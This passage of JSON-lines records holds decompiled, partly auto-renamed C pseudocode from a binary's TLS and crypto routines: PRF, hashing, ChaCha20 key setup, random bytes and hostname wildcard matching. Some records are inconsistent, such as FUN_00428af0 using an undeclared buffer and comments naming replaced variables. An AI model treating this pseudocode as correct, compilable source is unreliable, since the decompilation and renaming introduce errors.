FUN_00422a50(intermediate_buffer, extra_param3, extra_param4); \n        is_valid = optional_param1 != 0 && optional_param2 != 0; \n        if (is_valid) {\n            FUN_00422a50(intermediate_buffer, optional_param1, optional_param2); \n        }\n        FUN_00422af0(intermediate_buffer, additional_output_buffer, &buffer_size); \n        while (remaining_bytes != 0) { \n            FUN_004227f0(intermediate_buffer, hash_algorithm, hash_param1, hash_param2); \n            FUN_00422a50(intermediate_buffer, additional_output_buffer, buffer_size); \n            FUN_00422a50(intermediate_buffer, extra_param1, extra_param2); \n            FUN_00422a50(intermediate_buffer, extra_param3, extra_param4); \n            if (is_valid) {\n                FUN_00422a50(intermediate_buffer, optional_param1, optional_param2); \n            }\n            FUN_00422af0(intermediate_buffer, output_buffer_final, &buffer_size); \n            bytes_to_copy = (int)(remaining_bytes <= buffer_size ? remaining_bytes : buffer_size); \n            if (bytes_to_copy != 0) { \n                for (loop_index = 0; loop_index < bytes_to_copy; loop_index++) { \n                    *(undefined *)((long)output_buffer + loop_index + return_value) = output_buffer_final[loop_index]; \n                }\n                return_value += bytes_to_copy; \n                remaining_bytes -= bytes_to_copy; \n            }\n        }\n    } else {\n        hash_algorithm = FUN_00414210(&DAT_00437665); \n        half_param5 = (hash_param2 + 1U) >> 1; \n        uVar4 = FUN_00414210(&DAT_00437669); \n        memset(output_buffer, 0, remaining_bytes); \n        \n        FUN_00426540(hash_algorithm, 0x10, output_buffer, remaining_bytes, hash_param1, half_param5, extra_param1, extra_param2, extra_param3, extra_param4, optional_param1, optional_param2);\n        remaining_bytes_after_half = (ulong)(hash_param2 - half_param5); \n        \n        FUN_00426540(uVar4, 0x14, output_buffer, remaining_bytes, hash_param1 + remaining_bytes_after_half, remaining_bytes_after_half, extra_param1, extra_param2, extra_param3, extra_param4, optional_param1, optional_param2);\n    }\n    return; \n}"}
{"Function Name": "FUN_00426db0", "Address": "00426db0", "Source Code": "void FUN_00426db0(void) \n{\n    long inputValueRCX; \n    int inputValueR8D;  \n    \n    if (inputValueRCX != 0 && inputValueR8D != 0) {\n        FUN_00426a30(); \n    }\n}"}
{"Function Name": "FUN_00426fa0", "Address": "00426fa0", "Source Code": "int FUN_00426fa0(char *inputString, char *searchString)\n{\n    char firstChar; \n    int result = 0x2a; \n    char *asteriskPtr; \n    char *substring; \n    \n    if ((inputString == (char *)0x0) || (*inputString == '\\0')) {\n        \n        if (searchString == (char *)0x0 || *searchString == '\\0') {\n            return 0;\n        }\n        \n        return 0x2a;\n    } else {\n        \n        if (searchString == (char *)0x0) {\n            return 0x2a;\n        }\n        firstChar = *searchString; \n    }\n    \n    if ((firstChar != '\\0') && (result = strcmp(inputString, searchString), result != 0)) {\n        asteriskPtr = strchr(inputString, 0x2a); \n        \n        if ((asteriskPtr != (char *)0x0) && (firstChar = asteriskPtr[1], firstChar != '\\0')) {\n            substring = asteriskPtr + 1; \n            char *foundPtr = strstr(searchString, substring); \n            \n            if (foundPtr == (char *)0x0) {\n                substring = asteriskPtr + 2; \n                \n                if (firstChar != '.') {\n                    return 0x2a;\n                }\n            } else if (((long)foundPtr - (long)searchString != 0) &&\n                       (memchr(searchString, 0x2e, (long)foundPtr - (long)searchString) != (void *)0x0)) {\n                \n                return 0x2a;\n            }\n            result = strcasecmp(foundPtr, substring); \n        }\n    }\n    return result; \n}"}
{"Function Name": "FUN_00427230", "Address": "00427230", "Source Code": "void FUN_00427230(void **output_pointer, void *input_pointer, int size)\n{\n    \n    if (output_pointer != (void **)0x0) {\n        \n        if (*output_pointer != (void *)0x0) {\n            \n            free(*output_pointer);\n        }\n        \n        if (size != 0) {\n            \n            *output_pointer = malloc((long)(size + 1));\n            \n            if (*output_pointer != (void *)0x0) {\n                \n                memcpy(*output_pointer, input_pointer, (long)size);\n                \n                *(undefined *)((long)*output_pointer + (long)size) = 0;\n            }\n        } else {\n            \n            *output_pointer = (void *)0x0;\n        }\n    }\n}"}
{"Function Name": "FUN_00427290", "Address": "00427290", "Source Code": "void FUN_00427290(void **output_pointer, char *input_string, int input_length)\n{\n    \n    if (output_pointer != (void **)0x0) {\n        \n        if (*output_pointer != (void *)0x0) {\n            \n            free(*output_pointer);\n        }\n        \n        if (input_length >= 5) {\n            \n            *output_pointer = malloc((long)(input_length + 3));\n            \n            if (*output_pointer != (void *)0x0) {\n                \n                if (*input_string == '9') {\n                    \n                    *((undefined *)*output_pointer) = 0x31;\n                    *((undefined *)*output_pointer + 1) = 0x39;\n                } else {\n                    \n                    *((undefined *)*output_pointer) = 0x32;\n                    *((undefined *)*output_pointer + 1) = 0x30;\n                }\n                \n                memcpy((void *)((long)*output_pointer + 2), input_string, (long)input_length);\n                \n                *((undefined *)((long)*output_pointer + (long)input_length)) = 0;\n            } else {\n                \n                *output_pointer = (void *)0x0;\n            }\n        } else {\n            \n            *output_pointer = (void *)0x0;\n        }\n    }\n}"}
{"Function Name": "FUN_004283b0", "Address": "004283b0", "Source Code": "bool FUN_004283b0(void *buffer, int byteCount)\n{\n    \n    FILE *fileStream = fopen(\"/dev/urandom\", \"r\");\n    \n    \n    if (fileStream != (FILE *)0x0) {\n        \n        size_t bytesRead = fread(buffer, 1, (long)byteCount, fileStream);\n        \n        \n        fclose(fileStream);\n        \n        \n        return byteCount == (int)bytesRead;\n    }\n    \n    \n    return false;\n}"}
{"Function Name": "FUN_00428630", "Address": "00428630", "Source Code": "undefined4\nFUN_00428630(long param_1,uint param_2,undefined8 param_3,int param_4,undefined8 param_5,\nundefined4 param_6)\n{\nlong *plVar1;\nlong lVar2;\nint iVar3;\nint iVar4;\nundefined8 uVar5;\nundefined4 local_1dc;\nundefined local_1d8 [16];\nundefined local_1c8 [48];\nundefined local_198 [80];\nundefined local_148 [280];\nif (DAT_006698df == '\\0') {\nFUN_00428410();\n}\nif (*(char *)(param_1 + 0x66) == '\\0') {\nif (param_4 == 0) {\nreturn 0xffffffff;\n}\nplVar1 = *(long **)(param_1 + 0x68);\nif (plVar1 == (long *)0x0) {\nreturn 0xffffffff;\n}\niVar3 = *(int *)(param_1 + 0xb0);\n}\nelse {\nif (param_4 == 0) {\nreturn 0xffffffff;\n}\nplVar1 = *(long **)(param_1 + 0xa8);\nif (plVar1 == (long *)0x0) {\nreturn 0xffffffff;\n}\niVar3 = *(int *)(param_1 + 0xb4);\n}\nif (iVar3 == 0) {\nreturn 0xffffffff;\n}\nlVar2 = *plVar1;\nif (lVar2 == 0) {\nreturn 0xffffffff;\n}\nif (*(long *)(lVar2 + 0xe0) == 0) {\nreturn 0xffffffff;\n}\nif (*(int *)(lVar2 + 0xe8) == 0) {\nreturn 0xffffffff;\n}\niVar3 = FUN_004204c0(*(long *)(lVar2 + 0xe0),*(int *)(lVar2 + 0xe8),local_198);\nif (iVar3 != 0) {\nreturn 0xffffffff;\n}\nif (param_2 == 4) {\niVar3 = FUN_00414210(\"sha256\");\niVar4 = FUN_00412790(local_148);\nif (iVar4 != 0) {\nreturn 0xffffffff;\n}\niVar4 = FUN_00412800(local_148,param_5,param_6);\nif (iVar4 != 0) {\nreturn 0xffffffff;\n}\niVar4 = FUN_00412930(local_148,local_1d8);\nuVar5 = 0x20;\n}\nelse if (param_2 < 5) {\nif (param_2 == 1) {\niVar3 = FUN_00414210(&DAT_00437665);\niVar4 = FUN_00413d60(local_148);\nif (iVar4 != 0) {\nreturn 0xffffffff;\n}\niVar4 = FUN_00413dc0(local_148,param_5,param_6);\nif (iVar4 != 0) {\nreturn 0xffffffff;\n}\niVar4 = FUN_00413ef0(local_148,local_1d8);\nuVar5 = 0x10;\n}\nelse {\nif (param_2 != 2) {\nreturn 0xffffffff;\n}\niVar3 = FUN_00414210(&DAT_00437669);\niVar4 = FUN_00412450(local_148);\nif (iVar4 != 0) {\nreturn 0xffffffff;\n}\niVar4 = FUN_004124b0(local_148,param_5,param_6);\nif (iVar4 != 0) {\nreturn 0xffffffff;\n}\niVar4 = FUN_004125e0(local_148,local_1d8);\nuVar5 = 0x14;\n}\n}\nelse if (param_2 == 6) {\niVar3 = FUN_00414210(\"sha512\");\niVar4 = FUN_00412b90(local_148);\nif (iVar4 != 0) {\nreturn 0xffffffff;\n}\niVar4 = FUN_00412c40(local_148,param_5,param_6);\nif (iVar4 != 0) {\nreturn 0xffffffff;\n}\niVar4 = FUN_00412d70(local_148,local_1d8);\nuVar5 = 0x40;\n}\nelse {\nif (5 < param_2) {\nif (param_2 != 0xff) {\nreturn 0xffffffff;\n}\nFUN_00414210(&DAT_00437665);\niVar3 = FUN_00413d60(local_148);\nif (iVar3 != 0) {\nreturn 0xffffffff;\n}\niVar3 = FUN_00413dc0(local_148,param_5,param_6);\nif (iVar3 != 0) {\nreturn 0xffffffff;\n}\niVar3 = FUN_00413ef0(local_148,local_1d8);\nif (iVar3 != 0) {\nreturn 0xffffffff;\n}\niVar3 = FUN_00414210(&DAT_00437669);\niVar4 = FUN_00412450(local_148);\nif (iVar4 != 0) {\nreturn 0xffffffff;\n}\niVar4 = FUN_004124b0(local_148,param_5,param_6);\nif (iVar4 != 0) {\nreturn 0xffffffff;\n}\niVar4 = FUN_004125e0(local_148,local_1c8);\nif (iVar4 != 0) {\nreturn 0xffffffff;\n}\niVar4 = FUN_00412450(local_148);\nif (iVar4 != 0) {\nreturn 0xffffffff;\n}\niVar4 = FUN_004124b0(local_148,param_5,param_6);\nif (iVar4 != 0) {\nreturn 0xffffffff;\n}\niVar4 = FUN_004125e0(local_148,local_1c8);\nuVar5 = 0x24;\ngoto LAB_00428a60;\n}\niVar3 = FUN_00414210(\"sha384\");\niVar4 = FUN_00412ae0(local_148);\nif (iVar4 != 0) {\nreturn 0xffffffff;\n}\niVar4 = FUN_00412c40(local_148,param_5,param_6);\nif (iVar4 != 0) {\nreturn 0xffffffff;\n}\niVar4 = FUN_00412f30(local_148,local_1d8);\nuVar5 = 0x30;\n}\nif (iVar4 != 0) {\nreturn 0xffffffff;\n}\nLAB_00428a60:\nif ((iVar4 != 0) || (iVar3 < 0)) {\nreturn 0xffffffff;\n}\nlocal_1dc = 0;\nif (param_2 == 0xff) {\niVar3 = FUN_00425f00(param_3,param_4,local_1d8,uVar5,&local_1dc,local_198);\n}\nelse {\niVar3 = FUN_00421640(param_3,param_4,local_1d8,uVar5,1,iVar3,0,&local_1dc,local_198);\n}\nFUN_00420450(local_198);\nif (iVar3 == 0) {\nreturn local_1dc;\n}\nreturn 0;\n}\nLocal Variable: local_148 : undefined1\nLocal Variable: local_198 : undefined1\nLocal Variable: local_1c8 : undefined1\nLocal Variable: local_1d8 : undefined1\nLocal Variable: local_1dc : undefined4\nLocal Variable: local_1f0 : undefined8\nLocal Variable: local_1f8 : undefined8\nLocal Variable: local_200 : undefined8\nLocal Variable: local_208 : undefined8\nLocal Variable: local_210 : undefined8\nLocal Variable: local_218 : undefined8"}
{"Function Name": "FUN_00428af0", "Address": "00428af0", "Source Code": "\nulong FUN_00428af0(long input_pointer, uint hash_algorithm, undefined8 data_pointer, undefined4 data_length, long key_length, long nonce)\n{\n    long memory_value; // Variable to hold a long value from memory\n    int return_code; // Variable to hold an integer return value\n    int hash_return_code; // Variable to hold another integer return value\n    undefined4 random_value; // Variable to hold a 4-byte value\n    undefined8 output_size; // Variable to hold an 8-byte value\n    long another_memory_value; // Variable to hold another long value from memory\n    undefined output_buffer [16]; // Local buffer for storing data\n    undefined hash_buffer [280]; // Local buffer for storing data\n\n    // Check if any of the parameters are zero, return error code if true\n    if (nonce == 0 || input_pointer == 0 || key_length == 0) {\n        return 0xffffffff;\n    }\n    \n    // Retrieve a value from memory based on param_1\n    memory_value = *(long *)(input_pointer + 0x70);\n    // Check if the retrieved value is zero, return error code if true\n    if (memory_value == 0) {\n        return 0xffffffff;\n    }\n    \n    // Retrieve another value from memory based on lVar1\n    another_memory_value = *(long *)(memory_value + 0xe0);\n    // Check if the retrieved value is zero, return error code if true\n    if (another_memory_value == 0) {\n        return 0xffffffff;\n    }\n    \n    // Retrieve an integer value from memory based on lVar1\n    return_code = *(int *)(memory_value + 0xe8);\n    // Check if the retrieved integer is zero, return error code if true\n    if (return_code == 0) {\n        return 0xffffffff;\n    }\n    \n    // Check a global variable and call a function if it is zero\n    if (DAT_006698df == '\\0') {\n        FUN_00428410(); // Call a function\n        return_code = *(int *)(*(long *)(input_pointer + 0x70) + 0xe8); // Update iVar2\n        another_memory_value = *(long *)(*(long *)(input_pointer + 0x70) + 0xe0); // Update lVar6\n    }\n    \n    // Call a function with lVar6, iVar2, and local_198, check for errors\n    return_code = FUN_004204c0(another_memory_value, return_code, local_198);\n    if (return_code != 0) {\n        return 0xffffffff; // Return error code if function fails\n    }\n    \n    // Check the value of param_2 to determine the hashing algorithm\n    if (hash_algorithm == 4) {\n        return_code = FUN_00414210(\"sha256\"); // Initialize SHA-256\n        hash_return_code = FUN_00412790(hash_buffer); // Prepare local_148 for SHA-256\n        if (hash_return_code != 0) {\n            return 0xffffffff; // Return error code if preparation fails\n        }\n        hash_return_code = FUN_00412800(hash_buffer, data_pointer, data_length); // Hash data\n        if (hash_return_code != 0) {\n            return 0xffffffff; // Return error code if hashing fails\n        }\n        output_size = 0x20; // Set output size for SHA-256\n        hash_return_code = FUN_00412930(hash_buffer, output_buffer); // Finalize SHA-256\n    }\n    else if (hash_algorithm < 5) {\n        // Handle other hashing algorithms based on param_2\n        if (hash_algorithm == 1) {\n            return_code = FUN_00414210(&DAT_00437665); // Initialize another algorithm\n            hash_return_code = FUN_00413d60(hash_buffer); // Prepare local_148\n            if (hash_return_code != 0) {\n                return 0xffffffff; // Return error code if preparation fails\n            }\n            hash_return_code = FUN_00413dc0(hash_buffer, data_pointer, data_length); // Hash data\n            if (hash_return_code != 0) {\n                return 0xffffffff; // Return error code if hashing fails\n            }\n            output_size = 0x10; // Set output size\n            hash_return_code = FUN_00413ef0(hash_buffer, output_buffer); // Finalize hashing\n        }\n        else {\n            // Handle case for param_2 == 2\n            if (hash_algorithm != 2) {\n                // Handle case for param_2 == 0xff\n                if (hash_algorithm != 0xff) {\n                    return 0xffffffff; // Return error code for invalid param_2\n                }\n                output_size = 0; // Set output size to zero\n                goto LAB_00428f2b; // Jump to finalization\n            }\n            return_code = FUN_00414210(&DAT_00437669); // Initialize another algorithm\n            hash_return_code = FUN_00412450(hash_buffer); // Prepare local_148\n            if (hash_return_code != 0) {\n                return 0xffffffff; // Return error code if preparation fails\n            }\n            hash_return_code = FUN_004124b0(hash_buffer, data_pointer, data_length); // Hash data\n            if (hash_return_code != 0) {\n                return 0xffffffff; // Return error code if hashing fails\n            }\n            output_size = 0x14; // Set output size\n            hash_return_code = FUN_004125e0(hash_buffer, output_buffer); // Finalize hashing\n        }\n    }\n    else if (hash_algorithm == 6) {\n        return_code = FUN_00414210(\"sha512\"); // Initialize SHA-512\n        hash_return_code = FUN_00412b90(hash_buffer); // Prepare local_148 for SHA-512\n        if (hash_return_code != 0) {\n            return 0xffffffff; // Return error code if preparation fails\n        }\n        hash_return_code = FUN_00412c40(hash_buffer, data_pointer, data_length); // Hash data\n        if (hash_return_code != 0) {\n            return 0xffffffff; // Return error code if hashing fails\n        }\n        output_size = 0x40; // Set output size for SHA-512\n        hash_return_code = FUN_00412d70(hash_buffer, output_buffer); // Finalize SHA-512\n    }\n    else {\n        // Handle cases for param_2 > 5\n        if (5 < hash_algorithm) {\n            // Handle case for param_2 == 0xff\n            if (hash_algorithm != 0xff) {\n                return 0xffffffff; // Return error code for invalid param_2\n            }\n            FUN_00414210(&DAT_00437665); // Initialize another algorithm\n            return_code = FUN_00413d60(hash_buffer); // Prepare local_148\n            if (return_code != 0) {\n                return 0xffffffff; // Return error code if preparation fails\n            }\n            return_code = FUN_00413dc0(hash_buffer, data_pointer, data_length); // Hash data\n            if (return_code != 0) {\n                return 0xffffffff; // Return error code if hashing fails\n            }\n            return_code = FUN_00413ef0(hash_buffer, output_buffer); // Finalize hashing\n            if (return_code != 0) {\n                return 0xffffffff; // Return error code if finalization fails\n            }\n            FUN_00414210(&DAT_00437669); // Initialize another algorithm\n            return_code = FUN_00412450(hash_buffer); // Prepare local_148\n            if (return_code != 0) {\n                return 0xffffffff; // Return error code if preparation fails\n            }\n            return_code = FUN_004124b0(hash_buffer, data_pointer, data_length); // Hash data\n            if (return_code != 0) {\n                return 0xffffffff; // Return error code if hashing fails\n            }\n            return_code = FUN_004125e0(hash_buffer, output_buffer); // Finalize hashing\n            if (return_code != 0) {\n                return 0xffffffff; // Return error code if finalization fails\n            }\n            output_size = 0x24; // Set output size\n            goto LAB_00428f2b; // Jump to finalization\n        }\n        // Handle case for param_2 == 5\n        return_code = FUN_00414210(\"sha384\"); // Initialize SHA-384\n        hash_return_code = FUN_00412ae0(hash_buffer); // Prepare local_148 for SHA-384\n        if (hash_return_code != 0) {\n            return 0xffffffff; // Return error code if preparation fails\n        }\n        hash_return_code = FUN_00412c40(hash_buffer, data_pointer, data_length); // Hash data\n        if (hash_return_code != 0) {\n            return 0xffffffff; // Return error code if hashing fails\n        }\n        output_size = 0x30; // Set output size for SHA-384\n        hash_return_code = FUN_00412f30(hash_buffer, output_buffer); // Finalize SHA-384\n    }\n    \n    // Check for errors in finalization and return error code if any\n    if ((hash_return_code != 0) || (return_code < 0)) {\n        return 0xffffffff;\n    }\n    \n    // Call a function to generate a random number\n    random_value = FUN_00414410(\"sprng\");\n    // Call a function to process the generated random number\n    return_code = FUN_00421fa0(output_buffer, output_size, key_length, nonce, 1, 0, random_value, return_code, 0, local_198);\nLAB_00428f2b:\n    FUN_00420450(local_198); // Clean up local_198\n    return (ulong)(return_code == 0); // Return success or failure based on iVar2\n}\n"}
{"Function Name": "FUN_004293a0", "Address": "004293a0", "Source Code": "uint FUN_004293a0(long param_1,int param_2,byte *param_3,byte *param_4,byte *param_5,byte *param_6)\n{\nchar cVar1;\nchar cVar2;\nchar cVar3;\nchar cVar4;\nint iVar5;\nundefined4 uVar6;\nuint uVar7;\nuint uVar8;\nchar *pcVar9;\nundefined8 local_60;\nundefined local_58 [40];\ncVar1 = *(char *)(param_1 + 0x22358);\nif (cVar1 != '\\0') {\nif (cVar1 == '\\x01') {\nFUN_00422f90(param_1 + 0x111e8);\nFUN_00422f90(param_1 + 0xd8);\n}\nelse if (cVar1 == '\\x02') {\nlocal_60 = 0;\nFUN_004236b0(param_1 + 0x111e8,local_58,&local_60);\nFUN_004236b0(param_1 + 0xd8,local_58,&local_60);\n}\n*(undefined *)(param_1 + 0x22358) = 0;\n}\nif (DAT_006698df == '\\0') {\nFUN_00428410();\n}\niVar5 = FUN_004268b0(param_1);\nuVar6 = FUN_004140c0(&DAT_004378b1);\nif (iVar5 == 2) {\n*(uint *)(param_1 + 0xe8) =\n(uint)param_3[1] << 8 | (uint)param_3[2] << 0x10 | (uint)*param_3 |\n(uint)param_3[3] << 0x18;\n*(uint *)(param_1 + 0xec) =\n(uint)param_3[5] << 8 | (uint)param_3[6] << 0x10 | (uint)param_3[4] |\n(uint)param_3[7] << 0x18;\n*(uint *)(param_1 + 0xf0) =\n(uint)param_3[9] << 8 | (uint)param_3[10] << 0x10 | (uint)param_3[8] |\n(uint)param_3[0xb] << 0x18;\n*(uint *)(param_1 + 0xf4) =\n(uint)param_3[0xd] << 8 | (uint)param_3[0xe] << 0x10 | (uint)param_3[0xc] |\n(uint)param_3[0xf] << 0x18;\npcVar9 = \"expand 16-byte k\";\nif (param_2 << 3 == 0x100) {\nparam_3 = param_3 + 0x10;\npcVar9 = \"expand 32-byte k\";\n}\n*(uint *)(param_1 + 0xf8) =\n(uint)param_3[1] << 8 | (uint)param_3[2] << 0x10 | (uint)*param_3 |\n(uint)param_3[3] << 0x18;\n*(uint *)(param_1 + 0xfc) =\n(uint)param_3[5] << 8 | (uint)param_3[6] << 0x10 | (uint)param_3[4] |\n(uint)param_3[7] << 0x18;\n*(uint *)(param_1 + 0x100) =\n(uint)param_3[9] << 8 | (uint)param_3[10] << 0x10 | (uint)param_3[8] |\n(uint)param_3[0xb] << 0x18;\n*(uint *)(param_1 + 0x104) =\n(uint)param_3[0xd] << 8 | (uint)param_3[0xe] << 0x10 | (uint)param_3[0xc] |\n(uint)param_3[0xf] << 0x18;\n*(int *)(param_1 + 0xd8) =\n(int)pcVar9[1] << 8 | (int)pcVar9[2] << 0x10 | (int)*pcVar9 | (int)pcVar9[3] << 0x18;\n*(int *)(param_1 + 0xdc) =\n(int)pcVar9[5] << 8 | (int)pcVar9[6] << 0x10 | (int)pcVar9[4] | (int)pcVar9[7] << 0x18;\n*(int *)(param_1 + 0xe0) =\n(int)pcVar9[9] << 8 | (int)pcVar9[10] << 0x10 | (int)pcVar9[8] | (int)pcVar9[0xb] << 0x18;\ncVar1 = pcVar9[0xd];\ncVar2 = pcVar9[0xe];\ncVar3 = pcVar9[0xc];\ncVar4 = pcVar9[0xf];\n*(undefined4 *)(param_1 + 0x108) = 1;\n*(int *)(param_1 + 0xe4) =\n(int)cVar1 << 8 | (int)cVar2 << 0x10 | (int)cVar3 | (int)cVar4 << 0x18;\nif (param_4 != (byte *)0x0) {\n*(uint *)(param_1 + 0x10c) =\n(uint)param_4[1] << 8 | (uint)param_4[2] << 0x10 | (uint)*param_4 |\n(uint)param_4[3] << 0x18;\n*(uint *)(param_1 + 0x110) =\n(uint)param_4[5] << 8 | (uint)param_4[6] << 0x10 | (uint)param_4[4] |\n(uint)param_4[7] << 0x18;\n*(uint *)(param_1 + 0x114) =\n(uint)param_4[9] << 8 | (uint)param_4[10] << 0x10 | (uint)param_4[8] |\n(uint)param_4[0xb] << 0x18;\n}\n*(uint *)(param_1 + 0x111f8) =\n(uint)param_5[1] << 8 | (uint)param_5[2] << 0x10 | (uint)*param_5 |\n(uint)param_5[3] << 0x18;\n*(uint *)(param_1 + 0x111fc) =\n(uint)param_5[5] << 8 | (uint)param_5[6] << 0x10 | (uint)param_5[4] |\n(uint)param_5[7] << 0x18;\n*(uint *)(param_1 + 0x11200) =\n(uint)param_5[9] << 8 | (uint)param_5[10] << 0x10 | (uint)param_5[8] |\n(uint)param_5[0xb] << 0x18;\n*(uint *)(param_1 + 0x11204) =\n(uint)param_5[0xd] << 8 | (uint)param_5[0xe] << 0x10 | (uint)param_5[0xc] |\n(uint)param_5[0xf] << 0x18;\npcVar9 = \"expand 16-byte k\";\nif (param_2 << 3 == 0x100) {\nparam_5 = param_5 + 0x10;\npcVar9 = \"expand 32-byte k\";\n}\n*(uint *)(param_1 + 0x11208) =\n(uint)param_5[1] << 8 | (uint)param_5[2] << 0x10 | (uint)*param_5 |\n(uint)param_5[3] << 0x18;\n*(uint *)(param_1 + 0x1120c) =\n(uint)param_5[5] << 8 | (uint)param_5[6] << 0x10 | (uint)param_5[4] |\n(uint)param_5[7] << 0x18;\n*(uint *)(param_1 + 0x11210) =\n(uint)param_5[9] << 8 | (uint)param_5[10] << 0x10 | (uint)param_5[8] |\n(uint)param_5[0xb] << 0x18;\n*(uint *)(param_1 + 0x11214) =\n(uint)param_5[0xd] << 8 | (uint)param_5[0xe] << 0x10 | (uint)param_5[0xc] |\n(uint)param_5[0xf] << 0x18;\n*(int *)(param_1 + 0x111e8) =\n(int)pcVar9[1] << 8 | (int)pcVar9[2] << 0x10 | (int)*pcVar9 | (int)pcVar9[3] << 0x18;\n*(int *)(param_1 + 0x111ec) =\n(int)pcVar9[5] << 8 | (int)pcVar9[6] << 0x10 | (int)pcVar9[4] | (int)pcVar9[7] << 0x18;\n*(int *)(param_1 + 0x111f0) =\n(int)pcVar9[9] << 8 | (int)pcVar9[10] << 0x10 | (int)pcVar9[8] | (int)pcVar9[0xb] << 0x18;\ncVar1 = pcVar9[0xd];\ncVar2 = pcVar9[0xe];\ncVar3 = pcVar9[0xc];\ncVar4 = pcVar9[0xf];\n*(undefined4 *)(param_1 + 0x11218) = 1;\n*(int *)(param_1 + 0x111f4) =\n(int)cVar1 << 8 | (int)cVar2 << 0x10 | (int)cVar3 | (int)cVar4 << 0x18;\nif (param_6 != (byte *)0x0) {\n*(uint *)(param_1 + 0x1121c) =\n(uint)param_6[1] << 8 | (uint)param_6[2] << 0x10 | (uint)*param_6 |\n(uint)param_6[3] << 0x18;\n*(uint *)(param_1 + 0x11220) =\n(uint)param_6[5] << 8 | (uint)param_6[6] << 0x10 | (uint)param_6[4] |\n(uint)param_6[7] << 0x18;\n*(uint *)(param_1 + 0x11224) =\n(uint)param_6[9] << 8 | (uint)param_6[10] << 0x10 | (uint)param_6[8] |\n(uint)param_6[0xb] << 0x18;\n}\n*(undefined *)(param_1 + 0x22358) = 3;\nuVar7 = 0;\n}\nelse {\nif (iVar5 == 0) {\nuVar7 = FUN_00423340(uVar6,param_4,param_3,param_2,0,param_1 + 0xd8);\nuVar8 = FUN_00423340(uVar6,param_6,param_5,param_2,0,param_1 + 0x111e8);\nif ((uVar8 | uVar7) == 0) {\n*(undefined *)(param_1 + 0x22358) = 1;\nreturn 0;\n}\n}\nelse {\nuVar7 = FUN_004240f0(param_1 + 0xd8,uVar6,param_3,param_2);\nuVar8 = FUN_004240f0(param_1 + 0x111e8,uVar6,param_5,param_2);\nif ((uVar8 | uVar7) == 0) {\n*(undefined *)(param_1 + 0x22358) = 2;\nreturn uVar8 | uVar7;\n}\n}\nuVar7 = 0xffffffff;\n}\nreturn uVar7;\n}\nLocal Variable: local_58 : undefined1\nLocal Variable: local_60 : undefined8\nLocal Variable: local_6c : undefined4"}
{"Function Name": "FUN_00429f20", "Address": "00429f20", "Source Code": "ushort * FUN_00429f20(long inputAddress, undefined8 inputParam, uint size, undefined4 *outputSize)\n{\n    long memoryValue1; \n    int returnValue; \n    ushort *ushortArray; \n    long memoryValue2; \n    ulong allocationSize; \n    ulong allocatedSize; \n    undefined tempBuffer[80]; \n    *outputSize = 0; \n    \n    if (size != 0 && inputAddress != 0 && (memoryValue1 = *(long *)(inputAddress + 0x70), memoryValue1 != 0) &&\n        (memoryValue2 = *(long *)(memoryValue1 + 0xe0), memoryValue2 != 0 && (returnValue = *(int *)(memoryValue1 + 0xe8), returnValue != 0))) {\n        \n        \n        if (DAT_006698df == '\\0') {\n            FUN_00428410(); \n        }\n        \n        \n        returnValue = FUN_004204c0(memoryValue2, returnValue, tempBuffer);\n        \n        if (returnValue == 0) {\n            allocationSize = (ulong)size; \n            ushortArray = (ushort *)malloc(allocationSize); \n            allocatedSize = allocationSize; \n            \n            returnValue = FUN_0041ff30(inputParam, allocationSize, ushortArray, &allocatedSize, 0, 0, 0xffffffff, 1, outputSize, tempBuffer);\n            FUN_00420450(tempBuffer); \n            \n            if (returnValue != 0 || allocatedSize != 0x30 || (*ushortArray >> 8 | *ushortArray << 8) != *(ushort *)(inputAddress + 100)) {\n                allocatedSize = 0x30; \n                FUN_004283b0(ushortArray, 0x30); \n                \n                *ushortArray = *(ushort *)(inputAddress + 100) >> 8 | *(ushort *)(inputAddress + 100) << 8;\n            }\n            *outputSize = (undefined4)allocatedSize; \n            return ushortArray; \n        }\n    }\n    return (ushort *)0x0; \n}"}
{"Function Name": "FUN_0042a0e0", "Address": "0042a0e0", "Source Code": "void FUN_0042a0e0(long memory_address, int scaled_value)\n{\n    \n    if (memory_address != 0) {\n        \n        \n        *(int *)(memory_address + 0x22428) = (int)time((time_t *)0x0) + FUN_0042a0a0((scaled_value / 1000000) * 5);\n        return; \n    }\n    \n    FUN_00426500(FUN_0042a0a0(scaled_value));\n}"}
{"Function Name": "FUN_0042a290", "Address": "0042a290", "Source Code": "undefined8 FUN_0042a290(long param_1, void *param_2, uint param_3) {\n    long longValue; \n    ulong dataSize; \n    int newSize; \n    size_t copySize; \n    if (param_1 != 0) { \n        longValue = *(long *)(param_1 + 0x22360); \n        copySize = (size_t)param_3; \n        if (longValue == 0) { \n            longValue = FUN_00405c20(); \n        }\n        \n        if (((ushort)(*(short *)(param_1 + 100) - 0x303U) < 2) ||\n            ((ushort)(*(short *)(param_1 + 100) + 0x104U) < 2)) {\n            dataSize = copySize; \n            \n            if ((*(char *)(longValue + 0x330) == '\\0') &&\n                (FUN_0042a190(param_1), *(char *)(param_1 + 0x66) == '\\0' &&\n                (*(long *)(param_1 + 0x223e0) == 0) && (*(char *)(param_1 + 0x223c8) == '\\0')) &&\n                (dataSize = 0, param_3 != 0)) {\n                void *allocatedMemory = malloc(copySize); \n                *(void **)(param_1 + 0x223e0) = allocatedMemory; \n                if (allocatedMemory != (void *)0x0) { \n                    memcpy(allocatedMemory, param_2, copySize); \n                    *(uint *)(param_1 + 0x223e8) = param_3; \n                }\n            }\n            FUN_00412800(longValue, param_2, dataSize); \n            FUN_00412c40(longValue + 0x110, param_2, dataSize); \n        } else {\n            if (*(char *)(longValue + 0x330) == '\\0') { \n                FUN_0042a190(param_1); \n            }\n            FUN_00413dc0(longValue, param_2, copySize); \n            FUN_004124b0(longValue + 0x220, param_2, copySize); \n        }\n        \n        if ((*(char *)(param_1 + 0x223c8) != '\\0') && (param_3 != 0)) {\n            newSize = param_3 + *(int *)(param_1 + 0x223e8); \n            void *allocatedMemory = realloc(*(void **)(param_1 + 0x223e0), (long)newSize); \n            *(void **)(param_1 + 0x223e0) = allocatedMemory; \n            if (allocatedMemory != (void *)0x0) { \n                memcpy((void *)((ulong)*(uint *)(param_1 + 0x223e8) + (long)allocatedMemory), param_2, copySize); \n                *(int *)(param_1 + 0x223e8) = newSize; \n                return 0; \n            }\n            *(undefined4 *)(param_1 + 0x223e8) = 0; \n        }\n    }\n    return 0; \n}"}
